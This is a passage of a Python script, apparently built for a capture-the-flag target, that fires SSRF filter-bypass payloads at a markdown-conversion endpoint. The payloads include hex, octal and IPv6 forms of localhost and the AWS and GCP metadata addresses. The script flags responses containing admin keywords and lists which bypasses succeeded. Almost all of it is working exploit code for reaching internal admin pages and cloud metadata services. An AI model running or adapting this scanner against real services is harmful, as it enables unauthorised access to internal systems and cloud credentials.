# Additional miscellaneous payloads
ssrf_payloads["Category 6: Advanced Bypasses"] = [
    "http://0.0.0.0",
    "http://0",
    "http://[::]",
    "http://0000",
    "http://0x7f.0x0.0x0.0x0",
    "http://0177.0.0.0",
    "http://[::ffff:127.0.0.0]",
    "http://spoofed.burpcollaborator.net",
    "http://169.254.169.254",  # AWS metadata
    "http://metadata.google.internal"  # GCP metadata
]

# Results storage
results = {}
success_count = 0
blocked_count = 0
error_count = 0

# Admin content indicator keywords (to determine if admin access was successful)
admin_indicators = [
    "admin",
    "panel",
    "dashboard",
    "control",
    "manage",
    "flag",
    "FLAG",
    "secret",
    "private",
    "internal"
]

def test_payload(payload, category):
    """Test a single SSRF payload"""
    global success_count, blocked_count, error_count
    
    # Construct the full URL to test (pointing to admin interface)
    test_url = f"{payload}/admin" if not payload.endswith('/admin') else payload
    
    # Prepare request data
    data = {
        "url": test_url,
        "markdown_text": "test"
    }
    
    # Headers
    headers = {
        "Content-Type": "application/json"
    }
    
    try:
        print(f"\n[*] Testing: {test_url}")
        print(f"[*] Category: {category}")
        
        # Send POST request
        response = requests.post(
            CONVERT_ENDPOINT,
            json=data,
            headers=headers,
            timeout=10
        )
        
        # Analyze response
        response_text = response.text
        status_code = response.status_code
        
        # Check if admin content is present
        admin_content_found = any(indicator.lower() in response_text.lower() for indicator in admin_indicators)
        
        # Determine result category
        if admin_content_found:
            result = "ALLOWED"
            success_count += 1
        elif "connection refused" in response_text.lower() or "unable" in response_text.lower() or "failed" in response_text.lower():
            result = "BLOCKED"
            blocked_count += 1
        elif "error" in response_text.lower() or status_code >= 400:
            result = "ERROR"
            error_count += 1
        else:
            # Default to ERROR for unknown cases
            result = "ERROR"
            error_count += 1
        
        # Store detailed result
        result_data = {
            "payload": test_url,
            "status_code": status_code,
            "result": result,
            "response_snippet": response_text[:200] if len(response_text) > 200 else response_text,
            "admin_indicators": admin_content_found
        }
        
        print(f"[+] Status: {status_code} | Result: {result}")
        if admin_content_found:
            print(f"[!] ADMIN CONTENT DETECTED!")
            print(f"[!] Full response: {response_text}")
        else:
            print(f"[+] Response snippet: {response_text[:150]}...")
        
        return result_data
        
    except requests.exceptions.ConnectionError as e:
        print(f"[-] Connection Error: {e}")
        result_data = {
            "payload": test_url,
            "status_code": "N/A",
            "result": "BLOCKED",
            "response_snippet": f"Connection refused: {str(e)[:100]}",
            "admin_indicators": False
        }
        blocked_count += 1
        return result_data
        
    except requests.exceptions.Timeout:
        print(f"[-] Timeout")
        result_data = {
            "payload": test_url,
            "status_code": "N/A",
            "result": "ERROR",
            "response_snippet": "Request timeout",
            "admin_indicators": False
        }
        error_count += 1
        return result_data
        
    except Exception as e:
        print(f"[-] Unexpected error: {e}")
        result_data = {
            "payload": test_url,
            "status_code": "N/A",
            "result": "ERROR",
            "response_snippet": f"Error: {str(e)[:100]}",
            "admin_indicators": False
        }
        error_count += 1
        return result_data

def main():
    """Main testing function"""
    print("=" * 80)
    print("SSRF BYPASS FILTER FINGERPRINTING TEST")
    print(f"Target: {CONVERT_ENDPOINT}")
    print("=" * 80)
    
    # Test each category
    for category, payloads in ssrf_payloads.items():
        print(f"\n{'='*80}")
        print(f"TESTING: {category}")
        print(f"{'='*80}")
        
        category_results = []
        
        for payload in payloads:
            result = test_payload(payload, category)
            category_results.append(result)
            time.sleep(0.1)  # Small delay to avoid overwhelming the server
        
        results[category] = category_results
    
    # Generate summary report
    print(f"\n{'='*80}")
    print("FINAL ANALYSIS REPORT")
    print(f"{'='*80}")
    
    print(f"\n[+] Total payloads tested: {sum(len(p) for p in ssrf_payloads.values())}")
    print(f"[+] Allowed (Admin Access): {success_count}")
    print(f"[+] Blocked (Filter Caught): {blocked_count}")
    print(f"[+] Errors (Other Issues): {error_count}")
    
    # Detailed category analysis
    for category, category_results in results.items():
        allowed = [r for r in category_results if r['result'] == 'ALLOWED']
        blocked = [r for r in category_results if r['result'] == 'BLOCKED']
        errors = [r for r in category_results if r['result'] == 'ERROR']
        
        print(f"\n{'='*80}")
        print(f"CATEGORY: {category}")
        print(f"{'='*80}")
        print(f"[+] Total: {len(category_results)} | Allowed: {len(allowed)} | Blocked: {len(blocked)} | Errors: {len(errors)}")
        
        if allowed:
            print(f"\n[!!!] SUCCESSFUL BYPASSES:")
            for r in allowed:
                print(f"  - {r['payload']} (Status: {r['status_code']})")
        
        if blocked:
            print(f"\n[-] Blocked payloads:")
            for r in blocked[:5]:  # Show first 5
                print(f"  - {r['payload']}")
            if len(blocked) > 5:
                print(f"  ... and {len(blocked) - 5} more")
    
    # Filter fingerprinting analysis
    print(f"\n{'='*80}")
    print("FILTER FINGERPRINTING ANALYSIS")
    print(f"{'='*80}")
    
    # Check which IP formats work
    decimal_works = any('2130706433' in r['payload'] and r['result'] == 'ALLOWED' for r in sum(results.values(), []))
    hex_works = any('0x7f' in r['payload'] and r['result'] == 'ALLOWED' for r in sum(results.values(), []))
    octal_works = any('.0' in r['payload'] and '0177' in r['payload'] and r['result'] == 'ALLOWED' for r in sum(results.values(), []))
    ipv6_works = any('::1' in r['payload'] and r['result'] == 'ALLOWED' for r in sum(results.values(), []))
    
    print(f"\n[+] IP Format Analysis:")
    print(f"    - Decimal IP (2130706433): {'✗ BLOCKED' if not decimal_works else '✓ BYPASSED'}")
    print(f"    - Hex IP (0x7f...): {'✗ BLOCKED' if not hex_works else '✓ BYPASSED'}")
    print(f"    - Octal IP (0177...): {'✗ BLOCKED' if not octal_works else '✓ BYPASSED'}")
    print(f"    - IPv6 (::1): {'✗ BLOCKED' if not ipv6_works else '✓ BYPASSED'}")
    
    # Check encoding bypasses
    url_encoded_works = any('%2e' in r['payload'] and r['result'] == 'ALLOWED' for r in sum(results.values(), []))
    double_encoded_works = any('%25' in r['payload'] and r['result'] == 'ALLOWED' for r in sum(results.values(), []))
    
    print(f"\n[+] Encoding Analysis:")
    print(f"    - URL Encoding (%2e): {'✗ BLOCKED' if not url_encoded_works else '✓ BYPASSED'}")
    print(f"    - Double Encoding (%25): {'✗ BLOCKED' if not double_encoded_works else '✓ BYPASSED'}")
    
    # Check DNS bypasses
    dns_bypass_works = any('localtest.me' in r['payload'] and r['result'] == 'ALLOWED' for r in sum(results.values(), []))
    xip_io_works = any('xip.io' in r['payload'] and r['result'] == 'ALLOWED' for r in sum(results.values(), []))
    
    print(f"\n[+] DNS Bypass Analysis:")
    print(f"    - Alternative DNS (localtest.me): {'✗ BLOCKED' if not dns_bypass_works else '✓ BYPASSED'}")
    print(f"    - xip.io service: {'✗ BLOCKED' if not xip_io_works else '✓ BYPASSED'}")
    
    # Filter type determination
    if decimal_works or hex_works or octal_works:
        print(f"\n[!!!] CONCLUSION: Filter is STRING-BASED (IP interpretation bypassed)")
    elif ipv6_works:
        print(f"\n[!!!] CONCLUSION: Filter doesn't handle IPv6 properly")
    elif url_encoded_works:
        print(f"\n[!!!] CONCLUSION: Filter doesn't decode URL encoding")
    elif dns_bypass_works:
        print(f"\n[!!!] CONCLUSION: Filter relies on DNS blacklisting (bypassed)")
    else:
        print(f"\n[!!!] CONCLUSION: Filter appears to be DNS-based with strong validation")
    
    # List of successful bypass payloads
    all_allowed = [r for r in sum(results.values(), []) if r['result'] == 'ALLOWED']
    if all_allowed:
        print(f"\n{'='*80}")
        print("WORKING BYPASS PAYLOADS:")
        print(f"{'='*80}")
        for r in all_allowed:
            print(f"  - {r['payload']}")
    
    print(f"\n{'='*80}")
    print("SSRF FILTER FINGERPRINTING COMPLETE")
    print(f"{'='*80}")
    
